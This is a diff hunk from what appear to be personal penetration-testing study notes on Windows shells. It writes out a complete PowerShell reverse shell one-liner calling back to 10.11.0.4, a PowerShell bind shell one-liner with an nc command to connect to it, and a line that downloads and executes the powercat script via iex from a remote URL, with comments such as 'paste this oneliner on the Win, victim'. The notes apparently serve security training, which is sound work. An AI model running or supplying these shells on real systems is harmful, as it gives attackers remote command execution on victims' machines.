@@ -97,16 +97,22 @@ nc -lvnp 443
 # paste this oneliner on the Win, victim and we'll get the reverse shell:     // change IP and PORT!!
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close()"
 
-#POwerShell Bind Shells //2DO meke it OneLineR
-powershell -c "$listener = New-Object
-System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client =
-$listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes =
-0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data =
-(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback =
-(iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '>
-';$sendbyte =
-([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng
-th);$stream.Flush()};$client.Close();$listener.Stop()"
+#PowerShell Bind Shells   # first create the bind shell on the target, then connect from attacker machine
+powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
+nc -nv 10.11.0.22 443 --> receive connection from the victim with the bind shell // we can execute commands now
+
+# Powercar    #Powershell version of Netcat // simplifies the creation of bind/reverse shells.
+# start powershell on Win and load the script
+. .\powercat.ps1      #Loading a local PowerShell script using dot sourcing // only for the current powershell, need to be reexecuted when restarted or opened another powershel!
+# we can execute powercat now
+# If the target machine is connected to the Internet, we can do the same with a remote script by once again using the handy iex cmdlet as follows:
+iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+#It is worth noting that scripts loaded in this way will only be available in the current PowerShell instance and will need to be reloaded each time we restart PowerShell.
+#Now that our script is loaded, we can execute powercat as follows:
+powercat
+powercat -h
+
+#4.3.5 Powercat File Transfers
 
 
 
